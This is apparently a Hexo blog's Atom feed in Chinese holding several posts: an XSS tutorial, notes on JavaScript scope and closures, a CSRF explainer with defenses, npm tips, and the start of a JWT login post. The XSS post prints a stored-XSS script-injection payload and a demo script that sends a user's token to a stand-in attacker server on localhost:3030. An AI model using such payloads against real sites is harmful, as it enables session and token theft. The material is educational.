<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dong</title>
  
  <subtitle>y</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dong-666.github.io/"/>
  <updated>2022-09-11T01:54:00.921Z</updated>
  <id>http://dong-666.github.io/</id>
  
  <author>
    <name>天际线上的猪</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web安全-XSS</title>
    <link href="http://dong-666.github.io/2022/09/10/XSS/"/>
    <id>http://dong-666.github.io/2022/09/10/XSS/</id>
    <published>2022-09-10T07:28:20.000Z</published>
    <updated>2022-09-11T01:54:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>参考资料</p><ol><li><a href="https://zhuanlan.zhihu.com/p/340562247">闲庭信步聊前端 - 漫谈XSS - 知乎 (zhihu.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/396212876">什么是XSS 攻击 - 知乎 (zhihu.com)</a></li><li><a href="https://www.bilibili.com/video/BV1My4y1W7DF?p=1">黑客6小时带你上手web安全攻防、三种漏洞【XSS，CSRF和文件上传】彻底掌握常见web安全漏洞-持续更新中_哔哩哔哩_bilibili</a></li><li><a href="https://zhuanlan.zhihu.com/p/101300360">XSS的两种攻击方式及五种防御方式 - 知乎 (zhihu.com)</a></li><li><a href="https://blog.csdn.net/weixin_37672169/article/details/104840133">如何防止XSS攻击？_许文杰的博客-CSDN博客_如何防止xss攻击</a></li></ol><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p><strong>跨站脚本(Cross Site Scripting)</strong>攻击，也称XSS攻击，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，XSS攻击可以获取用户在被攻击网站的信息如cookie，接着就可以利用该cookie去冒充用户本人，进而去进行一些涉及用户隐私的操作。</p><h3 id="造成什么"><a href="#造成什么" class="headerlink" title="造成什么"></a>造成什么</h3><ul><li>获取页面数据</li><li>获取Cookies</li><li>劫持前端逻辑</li><li>发送请求到攻击者自己的网站实现资料的盗取</li><li>偷取网站任意数据</li><li>偷取用户密码和登陆状态</li><li>改变按钮的逻辑</li></ul><h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p><p>具体做法是攻击者将具有恶意攻击代码的信息通过注册或者其他写入数据库的行为发送至后端，这时候被攻击网站如果没有做一些过滤操作，则会将该数据存入数据库中，接着攻击者将使用被攻击网站查询该脚本的url发送给其他该网站的用户，若其他用户误点了该url，则会被攻击者攻击窃取cookie、token等其他数据</p><ol><li><p>如getCookie.js是一段获取当前用户cookie的脚本文件，攻击者在注册某网站或在某网站发表评论的时候，将<code>&lt;script src=&quot;http://localhost:3030/public/getCookie.js&quot;&gt;&lt;/script&gt;</code>进行伪造用户注册或发表评论内容(该文件在攻击者自己服务器上)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;script src=&#x27;http://localhost:3030/public/getCookie.js&#x27;&gt;&lt;/script&gt;&quot;</span></span><br><span class="line">或</span><br><span class="line"><span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;script src=&#x27;http://localhost:3030/public/getCookie.js&#x27;&gt;&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>数据库将该数据进行存储至数据库</p></li><li><p>假设是comment，当其他正常用户进入该评论有关的页面时，该脚本则会运行并窃取用户cookie</p></li><li><p>假设是user，若有一个用户展示页面需要将所有用户查出来并渲染，那么在该页面上就会被植入该恶意攻击代码，当某一登录的用户访问了用户展示界面，则被攻击</p></li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>假设访问的目标网站被黑客恶意存储了攻击脚本，3030端口的服务器是黑客的，3000端口是正常被访问的网站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">id</span> == <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="comment">// 假设id为123是黑客有意存储的一段攻击脚本，脚本被当作用户名存储，如&lt;script src=&quot;http://localhost:3030/public/getData.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment">// 服务器查询后将该值发送至前端，这里直接省去数据库查询</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;script src=&quot;http://localhost:3030/public/getData.js&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(req.<span class="property">query</span>.<span class="property">id</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>用户访问该查询链接</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.创建ajax对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="comment">// 2.告诉Ajax对象要向哪发送请求，以什么方式发送请求</span></span><br><span class="line"><span class="comment">// 1)请求方式 2)请求地址：必须以文件形式访问，否则会产生跨域问题</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://localhost:3000/search?id=123&#x27;</span>);</span><br><span class="line"><span class="comment">// 3.发送请求</span></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line"><span class="comment">// 4.获取服务器端响应到客户端的数据(异步)</span></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">let</span> id = xhr.<span class="property">responseText</span>;</span><br><span class="line">p.<span class="property">innerHTML</span> = p.<span class="property">innerHTML</span> + id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>黑客服务器的getData脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.创建ajax对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="comment">// 2.告诉Ajax对象要向哪发送请求，以什么方式发送请求</span></span><br><span class="line"><span class="comment">// 1)请求方式 2)请求地址：必须以文件形式访问，否则会产生跨域问题</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://localhost:3030/getData?token=&#x27;</span> + token);</span><br><span class="line"><span class="comment">// 3.发送请求</span></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line"><span class="comment">// 4.获取服务器端响应到客户端的数据(异步)</span></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>黑客拿到token</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getData&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">token</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/09/10/XSS/3498fa884cb6bb2eb9487fee88560ce.png" alt="3498fa884cb6bb2eb9487fee88560ce"></p><h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/09/10/XSS/c669312849b43a8b10415366654af53.png" alt="c669312849b43a8b10415366654af53"></p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>通过输入输出两个方向入手，即后端接收数据进行相关操作，或者返回结果的时候进行一些过滤操作</p><ol><li><p><strong>js转义</strong></p><p>如\对数据进行转义处理</p></li><li><p><strong>json</strong></p><p>直接将数据库读取的数据直接以json形式发送给前端，减少后端渲染，让前端渲染去吧</p></li><li><p><strong>使用第三方库XSS防御</strong></p></li><li><p><strong>输入内容长度控制</strong></p></li></ol>]]></content>
    
    <summary type="html">
    
      跨站脚本(Cross Site Scripting)攻击，也称XSS攻击...
    
    </summary>
    
    
      <category term="Web安全" scheme="http://Dong-666.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://Dong-666.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>重回作用域和闭包</title>
    <link href="http://dong-666.github.io/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/"/>
    <id>http://dong-666.github.io/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/</id>
    <published>2022-05-14T16:00:00.000Z</published>
    <updated>2022-09-11T02:04:27.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="重回作用域和闭包"><a href="#重回作用域和闭包" class="headerlink" title="重回作用域和闭包"></a>重回作用域和闭包</h1><p>最近阅读了《你不知道的JavaScript上卷》第一章-作用域和闭包，想着怎么也得写个读书笔记，不然不就白看（会忘）了嘛哈哈哈</p><p>闭包在之前b站学过，当时也写了一篇<a href="https://dong-666.github.io/2021/03/06/%E9%97%AD%E5%8C%85/">笔记</a>，这次在这本书中，似乎读出了当时在学的味道，不论是内容、还有顺序，都蛮有一种熟悉感，书和视频一样，都是从作用域（书中是词法作用域）入手，包括预解析，最后再聊到闭包，以及在章末引出下一章的知识点-好多人摸不着头脑的<strong>this</strong>。总的来说，两者一起结合看会让你收获颇丰，视频有着不一样的代码实践和轻松的bgm，以及一些解释性弹幕，可能会让你更快上手，书中则更为详细的讲解了作用域以及变量提升的知识点，从编译器、JavaScript引擎，到变量提升、LHS 和 RHS，专业名词多，但书中也不失幽默，无论是先看视频，还是先看书，都会让你对JavaScript这门语言，不敢说大开，也能’小‘开眼界。</p><p>笔记针对之前所学进行补充</p><h2 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h2><p>程序中的一段源代码在执行之前会经历三个步骤</p><ol><li><p>分词/词法分析（Tokenizing/Lexing）</p><p>这个过程会将由字符组成的字符串分解成（对编程语言来说）有意义的代码块，这些代码块被称为词法单元（token）</p></li><li><p>解析/语法分析（Parsing）</p><p>这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法 结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST）</p></li><li><p>代码生成</p><p> AST 转换为可执行代码的过程称被称为代码生成。这个过程与语言、目标平台等息息相关。 抛开具体细节，简单来说就是有某种方法可以将 var a = 2; 的 AST 转化为一组机器指令，用来创建一个叫作 a 的变量（包括分配内存等），并将一个值储存在 a 中。</p></li></ol><h2 id="LHS和RHS"><a href="#LHS和RHS" class="headerlink" title="LHS和RHS"></a>LHS和RHS</h2><blockquote><p>如果查找的目的是对变量进行赋值，那么就会使用 LHS 查询；如果目的是获取变量的值，就会使用 RHS 查询</p></blockquote><p>当引擎执行 LHS 查询时，如果在顶层（全局作用域）中也无法找到目标变量， 全局作用域中就会创建一个具有该名称的变量，并将其返还给引擎，前提是程序运行在非 “严格模式”下。</p><p>LHS 和 RHS 查询都会在当前执行作用域中开始，如果有需要（也就是说它们没有找到所 需的标识符），就会向上级作用域继续查找目标标识符，这样每次上升一级作用域（一层 楼），最后抵达全局作用域（顶层），无论找到或没找到都将停止。</p><h2 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h2><p>JavaScript使用的是词法作用域。</p><blockquote><p>定义：词法作用域就是定义在词法阶段的作用域。换句话说，词法作用域是由你在写代码时将变量和块作用域写在哪里来决定的，因此当词法分析器处理代码时会保持作用域 不变（大部分情况下是这样的）</p></blockquote><p>词法作用域意味着作用域是由书写代码时函数声明的位置来决定的。编译的词法分析阶段 基本能够知道全部标识符在哪里以及是如何声明的，从而能够预测在执行过程中如何对它们进行查找。</p><p><strong>遮蔽效应</strong>：在多层的嵌套作用域中可以定义同名的标识符，这叫作“遮蔽效应”（内部的标识符“遮蔽”了外部的标识符）。</p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><blockquote><p>定义：JavaScript 中的 eval(..) 函数可以接受一个字符串为参数，并将其中的内容视为好像在书 写时就存在于程序中这个位置的代码。</p></blockquote><p>如果 eval(..) 中所执行的代码包含有一个或多个声明（无论是变量还是函数），就会对 eval(..) 所处的词法作用域进行修改，且是在运行期修改书写期的词法作用域，<strong>这会严重影响性能</strong>，下面介绍的with同理。</p><p>setTimeout(..) 和 setInterval(..) 的第一个参数可以是字符串，字符串的内容可以被解释为一段动态生成的 函数代码。这些功能已经过时且并不被提倡。不要使用它们。</p><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><p>尽管 with 块可以将一个对象处理为词法作用域，但是这个块内部正常的 var 声明并不会被限制在这个块的作用域中，而是被添加到 with 所处的函数作用域中。</p><p>不推荐使用 eval(..) 和 with 的原因是会被严格模式所影响（限制）。with 被完全禁止，而在保留核心功能的前提下，间接或非安全地使用 eval(..) 也被禁止了。</p><p>JavaScript 引擎会在编译阶段进行数项的性能优化。其中有些优化依赖于能够根据代码的 词法进行静态分析，并预先确定所有变量和函数的定义位置，才能在执行过程中快速找到标识符。</p><p>如果引擎在代码中发现了 eval(..) 或 with，它只能简单地假设关于标识符位置的判断都是无效的，因为无法在词法分析阶段明确知道 eval(..) 会接收到什么代码，这些代码会如何对作用域进行修改，也无法知道传递给 with 用来创建新词法作用域的对象的内容到底是什么。</p><p>总而言之：这两个机制的副作用是引擎无法在编译时对作用域查找进行优化。</p><h2 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h2><p>声明在一个函数内部的变量或函数会在所处的作用域中“隐藏”起来，这是有意为之的良好软件的设计原则。</p><p><strong>最小特权原则</strong>：也叫最小授权或最小暴露原则。这个原则是指在软件设计中，应该最小限度地暴露必 要内容，而将其他内容都“隐藏”起来，比如某个模块或对象的 API 设计</p><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>引擎会在解释 JavaScript 代码之前首先对其进行编译。编译阶段中的一部分工作就是找到所有的 声明，并用合适的作用域将它们关联起来。</p><p>只有声明本身会被提升，而赋值或其他运行逻辑会留在原地。</p><p>函数声明会被提升，但是函数表达式却不会被提升。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/05/15/%E9%87%8D%E5%9B%9E%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85/image-20220428103103715.png" alt="image-20220428103103715"></p><p>var foo 尽管出现在 function foo()… 的声明之前，但它是重复的声明（因此被忽 略了），因为函数声明会被提升到普通变量之前。</p><p>我们习惯将 var a = 2; 看作一个声明，而实际上 JavaScript 引擎并不这么认为。它将 var a 和 a = 2 当作两个单独的声明，第一个是编译阶段的任务，而第二个则是执行阶段的任务。无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。声明本身会被提升，而包括函数表达式的赋值在内的赋值操作并不会提升。</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><blockquote><p>当函数可以记住并访问所在的词法作用域，即使函数是在当前词法作用域之外执行，这时就产生了闭包。</p></blockquote><ol><li>无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会持有对原始定义作用 域的引用，无论在何处执行这个函数都会使用闭包。</li><li>无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会持有对原始定义作用 域的引用，无论在何处执行这个函数都会使用闭包。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">bar</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure><p>bar() 对 a 的引用的方法是词法作用域的查找规则，而这些规则只是闭包的一部分。（但却是非常重要的一部分！</p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块模式需要具备两个必要条件</p><ol><li>必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。</li><li>封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并 且可以访问或者修改私有的状态。</li></ol><p>一个具有函数属性的对象本身并不是真正的模块。从方便观察的角度看，一个从函数调用 所返回的，只有数据属性而没有闭包函数的对象并不是真正的模块。</p><h2 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h2><p>我们知道：JavaScript 中的作用域就是词法作用域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">  <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="title function_">bar</span>();</span><br></pre></td></tr></table></figure><p>根据词法作用域，我们知道：词法作用域让 foo() 中的 a 通过 RHS 引用到了全局作用域中的 a，因此会输出 2。</p><p>但是动态作用域并不关心函数和作用域是如何声明以及在何处声明的，只关心它们从何处调 用。换句话说，作用域链是基于调用栈的，而不是代码中的作用域嵌套。因此，上面的foo() 在执行时将会输出 3。因为当 foo() 无法找到 a 的变量引用时，会顺着调用栈在调用 foo() 的地 方查找 a，而不是在嵌套的词法作用域链中向上查找。由于 foo() 是在 bar() 中调用的， 引擎会检查 bar() 的作用域，并在其中找到值为 3 的变量 a。</p><p>他们间的区别是：<strong>词法作用域是在写代码或者说定义时确定的，而动态作用域是在运行时确定 的。（this 也是！）词法作用域关注函数在何处声明，而动态作用域关注函数从何处调用。</strong></p><h2 id="ES5如何创造块作用域"><a href="#ES5如何创造块作用域" class="headerlink" title="ES5如何创造块作用域"></a>ES5如何创造块作用域</h2><p>我们知道在ES6种如何创造块作用域：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>但是在ES5中，我们如何去创建块作用域呢，使用catch！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;<span class="keyword">throw</span> <span class="number">2</span>;&#125;<span class="keyword">catch</span>(a)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( a ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      最近阅读了《你不知道的JavaScript上卷》第一章-作用域和闭包，想着怎么也得写个读书笔记，不然不就白看（会忘）了嘛哈哈哈
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://Dong-666.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://Dong-666.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-CSRF</title>
    <link href="http://dong-666.github.io/2022/04/22/CSRF/"/>
    <id>http://dong-666.github.io/2022/04/22/CSRF/</id>
    <published>2022-04-22T07:28:20.000Z</published>
    <updated>2022-09-11T01:59:26.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p>参考资料：</p><ol><li><a href="https://www.cnblogs.com/shanyou/p/5038794.html">🔺保护ASP.NET 应用免受 CSRF 攻击 - 张善友 - 博客园 (cnblogs.com)</a></li><li><a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">前端安全系列（二）：如何防止CSRF攻击？ - 美团技术团队 (meituan.com)</a></li><li><a href="https://www.bilibili.com/video/BV1iW411171s?spm_id_from=333.337.search-card.all.click">CSRF 攻击和防御 - Web 安全常识_哔哩哔哩_bilibili,</a></li><li><a href="https://blog.csdn.net/wdquan19851029/article/details/122175054">SpringSecurity CSRF引发的思考Cookie、Session、Token和JWT_知难行难1985的博客-CSDN博客</a></li></ol><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>CSRF是一种网络的攻击方式，攻击者可以使用该方式盗用你的身份，冒用你的cookie，对被攻击网站发起http请求，以你的名义进行转账等涉及个人财产和隐私安全的行为。</p><h2 id="攻击原理及流程"><a href="#攻击原理及流程" class="headerlink" title="攻击原理及流程"></a>攻击原理及流程</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/22/CSRF/510-20151211135009465-914739402.jpg" alt="csrf"></p><p>流程如下</p><ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li><li>攻击者引诱受害者访问了b.com。</li><li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li><li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li><li>a.com以受害者的名义执行了act=xx。</li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul><h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><blockquote><p><strong>疑问：</strong>浏览器对于 cookie 也是存在同源限制的，也就是与 cookie（domain）处于不同源的网站，浏览器是不会让该网站获取到这个 cookie。那为什么csrf攻击是可行的？</p></blockquote><blockquote><p><strong>解答：</strong>原因是浏览器使用 cookie 的情况</p><p>除了跨域 XHR 请求情况下，浏览器在发起请求的时候会把符合要求的 cookie 自动带上。(域名，有效期，路径，secure 属性)，跨域 XHR 的请求的情况下，也可以携带 Cookie。同时浏览器允许跨域提交表单。也就是说，向同一个服务器发请求时会自动带上浏览器保存的对于那个服务器的cookie，而不管你从哪个网站发请求。因为每次请求都会携带在http头上，也是造成带宽浪费的一个原因。但是读取cookie是读取不了的，攻击者没办法知道cookie的内容</p></blockquote><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><ol><li>验证 HTTP Referer 字段<ul><li>它记录了该 HTTP 请求的来源地址</li><li>Referer 的值是由浏览器提供的，可以伪造</li></ul></li><li>在请求地址（表单）中添加 token 并验证（Anti CSRF Token）<ul><li>使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token</li></ul></li><li>在 HTTP 头中自定义属性并验证<ul><li>将token放到 HTTP 头中自定义的属性里</li><li>通过XMLHttpRequest 类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作</li></ul></li><li>验证码验证</li></ol>]]></content>
    
    <summary type="html">
    
      CSRF是一种网络的攻击方式，攻击者可以使用该方式盗用你的身份，冒用你的cookie，对被攻击网站发起http请求，以你的名义进行转账等涉及个人财产和隐私安全的行为。
    
    </summary>
    
    
      <category term="Web安全" scheme="http://Dong-666.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://Dong-666.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>npm操作</title>
    <link href="http://dong-666.github.io/2022/04/18/NPM%20%E6%93%8D%E4%BD%9C/"/>
    <id>http://dong-666.github.io/2022/04/18/NPM%20%E6%93%8D%E4%BD%9C/</id>
    <published>2022-04-18T07:00:00.000Z</published>
    <updated>2022-04-17T12:33:24.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="npm操作"><a href="#npm操作" class="headerlink" title="npm操作"></a>npm操作</h1><p>查看全局安装的npm包： <code>npm list -g -dept 0</code></p><p>解决因node版本过高而引起的依赖安装失败报错问题：<code>npm i --legacy-peer-deps</code> </p><p>清除缓存：<code>npm cache clean</code></p><p>（待补充…）</p>]]></content>
    
    <summary type="html">
    
      记录一些npm操作
    
    </summary>
    
    
      <category term="Node.js" scheme="http://Dong-666.github.io/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://Dong-666.github.io/tags/Node-js/"/>
    
      <category term="npm" scheme="http://Dong-666.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>node登陆验证之jsonwebtoken</title>
    <link href="http://dong-666.github.io/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/"/>
    <id>http://dong-666.github.io/2022/04/15/node-token%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E9%AA%8C%E8%AF%81/</id>
    <published>2022-04-15T13:40:39.000Z</published>
    <updated>2022-04-17T15:13:11.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用jsonwebtoken进行node端登陆注册验证"><a href="#使用jsonwebtoken进行node端登陆注册验证" class="headerlink" title="使用jsonwebtoken进行node端登陆注册验证"></a>使用jsonwebtoken进行node端登陆注册验证</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><strong>简介</strong>：Token在计算机身份认证中是<a href="https://baike.baidu.com/item/令牌/9716092">令牌</a>（临时）的意思，在词法分析中是标记的意思。一般作为邀请、登录系统使用。</p><p>Token 是在服务端产生的。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回 Token 给前端。前端可以在每次请求的时候带上 Token 证明自己的合法地位。如果这个 Token 在服务端持久化（比如存入数据库），那它就是一个永久的身份令牌（<a href="https://www.cnblogs.com/xuxinstyle/p/9675541.html">参考资料</a>）</p></blockquote><h3 id="为什么使用它"><a href="#为什么使用它" class="headerlink" title="为什么使用它"></a>为什么使用它</h3><p>token解决的问题如下</p><ol><li>Token 完全由应用管理，所以它可以避开同源策略</li><li>Token 可以避免 <a 